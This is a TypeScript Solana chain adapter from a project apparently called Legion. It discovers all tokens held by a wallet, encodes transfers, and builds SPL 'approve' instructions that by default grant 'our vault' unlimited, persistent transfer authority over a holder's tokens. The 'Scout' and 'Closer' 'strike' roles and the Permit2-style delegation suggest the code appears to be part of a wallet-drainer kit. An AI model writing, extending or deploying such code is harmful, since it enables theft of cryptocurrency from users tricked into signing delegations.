/**
 * @file svm-adapter.ts
 * @module @legion/core/adapters
 * @sentinel Closer (SVM strike execution)
 *
 * @solana/web3.js-based SVM chain adapter. Handles native SOL and SPL token
 * balance queries, transfer instruction encoding, and compute-unit estimation.
 *
 * Key SVM constraints (solana.md §pitfalls):
 *  - SPL token balances live in Associated Token Accounts (ATAs), NOT on the
 *    owner's System-account. This adapter derives ATAs deterministically.
 *  - CU limit MUST be set explicitly on complex routes (default 200k is too low
 *    for multi-hop Jupiter routes). Add 10% headroom to simulation result.
 *  - `simulateTransaction` with `replaceRecentBlockhash: true` avoids stale-
 *    blockhash failures during estimation.
 *  - SOL balance returns a JS number (safe — max SOL supply ≈ 0.5 × 10^18 lamps).
 *    SPL amounts are parsed as BigInt from raw account data (uint64 LE at offset 64).
 *
 * Numeric invariant (drizzle.md §numeric(78,0)):
 *  All numeric returns are Uint256 strings. BigInt(result) at call site; NEVER Number().
 */

import {
  Connection,
  PublicKey,
  VersionedTransaction,
} from '@solana/web3.js'
import { BaseChainAdapter, type DiscoveredAsset, type Uint256 } from './base-adapter.js'
import { GatekeeperError } from './address-resolver.js'
import { resolveSolanaNetwork, resolveSolanaRpcUrl } from '../lib/chain-rpc.js'

/**
 * Scout / Closer — institutional Solana JSON-RPC lane (`RPC_SOLANA_PRIVATE` ingress first,
 * then QuickNode `SOLANA_RPC_URL`, public mirrors, Chainstack, sovereign mesh fallback).
 * When unset, falls back to `SOLANA_NETWORK` default cluster RPC (mainnet/devnet/testnet).
 */
export function resolveInstitutionalSolanaRpcUrl(): string {
  return resolveSolanaRpcUrl()
}

export { resolveSolanaNetwork }

// ─── SPL Token Program constants ─────────────────────────────────────────────
// Hard-coded well-known program addresses — no external dependency required.
// Source: https://spl.solana.com/token

const TOKEN_PROGRAM_ID = new PublicKey(
  'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA',
)

const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey(
  'ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV',
)

// SPL Token account data layout offsets (exactly 165 bytes when initialized)
// Source: https://spl.solana.com/token §Account Layout
const SPL_AMOUNT_OFFSET   = 64   // uint64 LE token balance
const SPL_DECIMALS_OFFSET = 44   // uint8 decimals in the Mint account layout

// Mint account layout: [mint_authority_option(4), mint_authority(32), supply(8),
//   decimals(1), is_initialized(1), freeze_authority_option(4), freeze_authority(32)]
// Total: 82 bytes

// SPL Token approve instruction discriminator
const SPL_APPROVE_DISCRIMINATOR = 4

// Maximum u64 value — used for "infinite" SPL Token delegation.
// Solana token amounts are u64 (not u256); this is 2^64 - 1.
const MAX_UINT64 = '18446744073709551615'

// ─── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Derives the Associated Token Account (ATA) address for (owner, mint).
 * Uses the canonical 3-seed PDA derivation of the Associated Token Account program.
 * Seeds: [owner_pubkey, TOKEN_PROGRAM_ID, mint_pubkey]
 */
function deriveAta(owner: PublicKey, mint: PublicKey): PublicKey {
  const [ata] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID,
  )
  return ata
}

/**
 * Safely constructs a PublicKey from a base58 string.
 * Throws GatekeeperError if the string is not a valid Ed25519 public key.
 */
function toPublicKey(address: string): PublicKey {
  try {
    return new PublicKey(address)
  } catch {
    throw new GatekeeperError(address)
  }
}

// ─── EstimateParams ───────────────────────────────────────────────────────────

// ─── DelegateAuthorityData ────────────────────────────────────────────────────
// SVM analog of EVM's Permit2TypedData. Describes a pending SPL Token "approve"
// instruction that the Closer must sign and submit to establish delegation.
//
// Persistence model:
//   EVM  — Permit2 stores the allowance on-chain once the EIP-712 sig is submitted
//          via `permit()`. The sig is stored in approval_ledger.signature_data.
//   SVM  — Solana has no native permit/allowance registry. Instead, the Token
//          Program's `approve` instruction writes a delegate + delegated_amount
//          field directly into the source ATA account data. The approval tx
//          signature is stored in approval_ledger.signature_data as proof of
//          delegation. Subsequent transfers use Token.transferChecked with our
//          vault as the `authority` account (not the owner).
//
// Difference: EVM approval is off-chain until used; SVM approval is on-chain
// immediately and persists in the token account until explicitly revoked or
// the delegated_amount is fully consumed.

export interface DelegateAuthorityData {
  /** Hex-encoded SPL Token `approve` instruction data bytes: [4 (u8), amount (u64 LE)] */
  instructionData: string
  /** Source ATA address (the token account whose delegate is being set) */
  sourceAta: string
  /** Delegate pubkey (our vault) that will gain transfer authority */
  delegate: string
  /** Delegated amount as Uint256 string. MAX_UINT64 = persistent until revoked. */
  delegatedAmount: Uint256
  /**
   * Instruction accounts in required order for Token Program `approve`:
   * [0] source ATA (writable)
   * [1] delegate   (readonly)
   * [2] owner      (signer)
   */
  accounts: [string, string, string]
}

export interface SvmEstimateParams {
  /**
   * Base64-encoded fully-serialized VersionedTransaction.
   * Build via: `Buffer.from(tx.serialize()).toString('base64')`
   * Simulation uses `replaceRecentBlockhash: true` so a stale blockhash in the
   * serialized tx does not cause an estimation failure (solana.md §Blockhash).
   */
  txBase64: string
}

// ─── SvmAdapter ───────────────────────────────────────────────────────────────

export class SvmAdapter extends BaseChainAdapter {
  readonly chainId: string

  private readonly connection:           Connection
  private readonly _fallbackConnections: Connection[]
  private readonly mintPubkey:           PublicKey | null

  /**
   * @param options.chainId        - CAIP-2 id, e.g. "svm:mainnet-beta".
   * @param options.rpcUrl         - Primary Solana RPC endpoint.
   *                                 Hybrid Provisioning Sync: pass the Chainstack URL
   *                                 here when USE_HYBRID_MODE is active — all SVM calls
   *                                 are routed through the managed endpoint first.
   * @param options.fallbackRpcUrls - Ordered fallback URLs tried on primary failure.
   *                                  Failover Protocol Locked: SVM_MESH nodes from
   *                                  HybridProviderStack.getSvmStack() slot here.
   * @param options.mintPubkey     - Base58 SPL mint address. Omit for native SOL.
   */
  constructor(options: {
    chainId: string
    rpcUrl: string
    fallbackRpcUrls?: string[]
    mintPubkey?: string
  }) {
    super()
    this.chainId = options.chainId
    // 'confirmed' commitment: supermajority vote, ~1–2 s, safe for balance reads.
    // Archivist re-confirms at 'finalized' for archival records (solana.md §RPC).
    this.connection            = new Connection(options.rpcUrl, 'confirmed')
    this._fallbackConnections  = (options.fallbackRpcUrls ?? []).map(
      url => new Connection(url, 'confirmed'),
    )
    this.mintPubkey =
      options.mintPubkey != null ? toPublicKey(options.mintPubkey) : null
  }

  // ─── Fallback rotation ───────────────────────────────────────────────────
  // Mirrors EvmAdapter's withRpcRotation() for SVM.
  // Failover Protocol Locked: on ANY error from the primary (Chainstack or public),
  // tries each fallback Connection in order.  No fixed-interval sleep — Solana's
  // Connection constructor is synchronous so the overhead is negligible.

  private async withFallback<T>(fn: (conn: Connection) => Promise<T>): Promise<T> {
    try {
      return await fn(this.connection)
    } catch (primaryErr: unknown) {
      for (const fb of this._fallbackConnections) {
        try {
          return await fn(fb)
        } catch {
          // Try next fallback
        }
      }
      throw primaryErr
    }
  }

  /**
   * Returns native SOL (lamports) or SPL token balance as a Uint256 string.
   *
   * Native SOL: uses `getBalance` → returns a JS number (safe; max SOL supply
   *   ≈ 5.7 × 10^17 lamports, well within Number.MAX_SAFE_INTEGER bounds).
   *
   * SPL token: derives the owner's ATA, fetches account data, and parses the
   *   uint64 LE amount at byte offset 64. Returns '0' if the ATA doesn't exist
   *   (Closer must create it before the transfer — solana.md §pitfalls ATA).
   */
  async getBalance(address: string): Promise<Uint256> {
    const owner = toPublicKey(address)

    if (this.mintPubkey === null) {
      const lamports = await this.withFallback(conn => conn.getBalance(owner))
      return BigInt(lamports).toString()
    }

    const mintPk = this.mintPubkey
    const ata    = deriveAta(owner, mintPk)
    const accountInfo = await this.withFallback(conn => conn.getAccountInfo(ata))

    if (accountInfo === null) {
      // ATA does not exist — effective balance is zero.
      // Closer must prepend createAssociatedTokenAccount instruction.
      return '0'
    }

    const data = accountInfo.data as Buffer
    const lo = BigInt(data.readUInt32LE(SPL_AMOUNT_OFFSET))
    const hi = BigInt(data.readUInt32LE(SPL_AMOUNT_OFFSET + 4))
    const amount = lo | (hi << 32n)
    return amount.toString()
  }

  /**
   * Provider Restriction Bypassed path:
   * native-only fallback for providers that block token-account RPC methods.
   * Returns only SOL balance in lamports as Uint256 string.
   */
  async getNativeBalanceOnly(address: string): Promise<Uint256> {
    const owner = toPublicKey(address)
    const lamports = await this.withFallback(conn => conn.getBalance(owner))
    return BigInt(lamports).toString()
  }

  /**
   * Returns hex-encoded instruction data bytes for a transfer.
   *
   * Native SOL → SystemProgram.transfer instruction data (12 bytes):
   *   [discriminator: u32 LE = 2][lamports: u64 LE]
   *
   * SPL token → Token Program transfer instruction data (9 bytes):
   *   [discriminator: u8 = 3][amount: u64 LE]
   *
   * The Closer wraps these bytes into a full VersionedTransaction with the
   * correct static account keys (source ATA, destination ATA, owner, program)
   * and an up-to-date blockhash (solana.md §Blockhash & Replay).
   *
   * @param target - Destination owner address (base58). Closer derives the ATA.
   * @param amount - Transfer amount as Uint256 string (lamports or raw SPL units).
   */
  getTransferData(target: string, amount: Uint256): string {
    // Validate destination is a real pubkey; surface GatekeeperError if not.
    toPublicKey(target)

    const value = BigInt(amount)

    if (this.mintPubkey === null) {
      // SystemProgram.transfer discriminator = 2 (u32 LE), lamports = u64 LE
      const buf = Buffer.alloc(12)
      buf.writeUInt32LE(2, 0)
      buf.writeBigUInt64LE(value, 4)
      return '0x' + buf.toString('hex')
    }

    // Token Program transfer discriminator = 3 (u8), amount = u64 LE
    const buf = Buffer.alloc(9)
    buf.writeUInt8(3, 0)
    buf.writeBigUInt64LE(value, 1)
    return '0x' + buf.toString('hex')
  }

  // ─── delegateAuthority ────────────────────────────────────────────────────

  /**
   * Builds the SPL Token `approve` instruction spec for delegating transfer
   * authority of a token account to our vault.
   *
   * This is the SVM equivalent of `buildPermit2Data()` in EvmAdapter:
   *  - EVM: off-chain EIP-712 sig → submitted once → stored by Permit2 contract.
   *  - SVM: on-chain `approve` tx → stored in ATA's delegate + delegated_amount
   *         fields. Subsequent transfers use our vault as the `authority` account.
   *
   * After the Closer submits the approve transaction, store the resulting tx
   * signature in `approval_ledger.signature_data` as the delegation proof.
   * Set `approval_ledger.approval_type = 'infinite'` when amount = MAX_UINT64.
   *
   * @param options.mintAddress - SPL mint of the token to delegate.
   * @param options.ownerAddress - Token holder's wallet (the signer of approve).
   * @param options.delegate     - Our vault pubkey that receives transfer authority.
   * @param options.amount       - Tokens to delegate. Defaults to MAX_UINT64 (infinite).
   */
  delegateAuthority(options: {
    mintAddress: string
    ownerAddress: string
    delegate: string
    amount?: Uint256
  }): DelegateAuthorityData {
    const owner = toPublicKey(options.ownerAddress)
    const mint = toPublicKey(options.mintAddress)
    const delegatePubkey = toPublicKey(options.delegate)
    const amount = options.amount ?? MAX_UINT64
    const sourceAta = deriveAta(owner, mint)

    // SPL Token `approve` instruction data: discriminator(u8) + amount(u64 LE)
    const buf = Buffer.alloc(9)
    buf.writeUInt8(SPL_APPROVE_DISCRIMINATOR, 0)
    buf.writeBigUInt64LE(BigInt(amount), 1)

    return {
      instructionData: '0x' + buf.toString('hex'),
      sourceAta: sourceAta.toBase58(),
      delegate: delegatePubkey.toBase58(),
      delegatedAmount: amount,
      accounts: [
        sourceAta.toBase58(),      // [0] source ATA  (writable)
        delegatePubkey.toBase58(), // [1] delegate     (readonly)
        owner.toBase58(),          // [2] owner        (signer)
      ],
    }
  }

  // ─── discoverAssets ───────────────────────────────────────────────────────

  /**
   * Discovers all non-zero assets held by `owner` on this Solana chain.
   *
   * Strategy:
   *  1. getProgramAccounts(TOKEN_PROGRAM_ID) with two filters:
   *     - dataSize: 165  — only initialized token accounts (exact SPL layout size)
   *     - memcmp at offset 32 — owner field must match the wallet pubkey
   *     This returns ALL SPL token accounts in a single RPC call.
   *  2. Extract mint pubkeys and token amounts from each account's raw data.
   *  3. getMultipleAccountsInfo on all distinct mint pubkeys to batch-fetch
   *     decimals (byte 44 in the mint account layout). Single RPC round-trip.
   *  4. Also include native SOL balance (separate getBalance call).
   *  5. Filter out zero-balance entries.
   *
   * @param owner - Wallet address (base58). Throws GatekeeperError if malformed.
   * @returns Non-zero DiscoveredAsset array, native SOL first (if non-zero).
   */
  async discoverAssets(owner: string): Promise<DiscoveredAsset[]> {
    // Case-Sensitivity Protocol Synchronized:
    // SVM addresses are persisted exactly as supplied (base58 is case-sensitive).
    const ownerPubkey = toPublicKey(owner)
    const results: DiscoveredAsset[] = []

    // ── Native SOL ────────────────────────────────────────────────────────────
    const lamports = await this.withFallback(conn => conn.getBalance(ownerPubkey))
    if (lamports > 0) {
      results.push({
        assetAddress: null,
        balance: BigInt(lamports).toString(),
        symbol: 'SOL',
        decimals: 9,
      })
    }

    // ── SPL token accounts owned by this wallet ────────────────────────────────
    const tokenAccounts = await this.withFallback(conn =>
      conn.getProgramAccounts(TOKEN_PROGRAM_ID, {
        filters: [
          { dataSize: 165 },  // Exactly 165 bytes = initialized Token account
          { memcmp: { offset: 32, bytes: ownerPubkey.toBase58() } },
        ],
      }),
    )

    if (tokenAccounts.length === 0) return results

    // Parse mint pubkey and token amount from each account's raw data
    const parsed: Array<{ mint: PublicKey; amount: bigint }> = []
    for (const { account } of tokenAccounts) {
      const data = account.data as Buffer
      if (data.length < 72) continue
      const mint = new PublicKey(data.slice(0, 32))
      const lo = BigInt(data.readUInt32LE(SPL_AMOUNT_OFFSET))
      const hi = BigInt(data.readUInt32LE(SPL_AMOUNT_OFFSET + 4))
      const amount = lo | (hi << 32n)
      if (amount === 0n) continue
      parsed.push({ mint, amount })
    }

    if (parsed.length === 0) return results

    // Batch-fetch mint accounts to get decimals (offset 44, u8)
    const mintPubkeys = parsed.map((p) => p.mint)
    const mintInfos = await this.withFallback(conn => conn.getMultipleAccountsInfo(mintPubkeys))

    for (let i = 0; i < parsed.length; i++) {
      const { mint, amount } = parsed[i]!
      const mintInfo = mintInfos[i]
      let decimals: number | undefined
      if (mintInfo && mintInfo.data.length > SPL_DECIMALS_OFFSET) {
        decimals = (mintInfo.data as Buffer).readUInt8(SPL_DECIMALS_OFFSET)
      }
      results.push({
        assetAddress: mint.toBase58(),
        balance: amount.toString(),
        ...(decimals !== undefined ? { decimals } : {}),
      })
    }

    return results
  }

  /**
   * Estimates compute units for a VersionedTransaction via RPC simulation.
   *
   * Pass a base64-encoded serialized VersionedTransaction. Simulation uses
   * `replaceRecentBlockhash: true` so estimation is blockhash-independent.
   *
   * Falls back to 200_000 (Solana's default per-tx CU limit) when:
   *  - no txBase64 is provided
   *  - simulation returns an error
   *  - RPC call fails
   *
   * Callers SHOULD add 10% headroom to the returned value before passing it
   * to `ComputeBudgetProgram.setComputeUnitLimit` (solana.md §pitfalls CU).
   */
  async estimateExecutionGas(params: unknown): Promise<Uint256> {
    const DEFAULT_CU = '200000'
    const p = params as Partial<SvmEstimateParams>

    if (!p.txBase64) return DEFAULT_CU

    try {
      const txBytes = Buffer.from(p.txBase64, 'base64')
      const tx = VersionedTransaction.deserialize(txBytes)

      const result = await this.withFallback(conn =>
        conn.simulateTransaction(tx, { replaceRecentBlockhash: true }),
      )

      if (result.value.err) return DEFAULT_CU

      const unitsConsumed = result.value.unitsConsumed ?? 200_000
      return BigInt(unitsConsumed).toString()
    } catch {
      // RPC failure or deserialization error — safe default (solana.md §pitfalls).
      return DEFAULT_CU
    }
  }
}
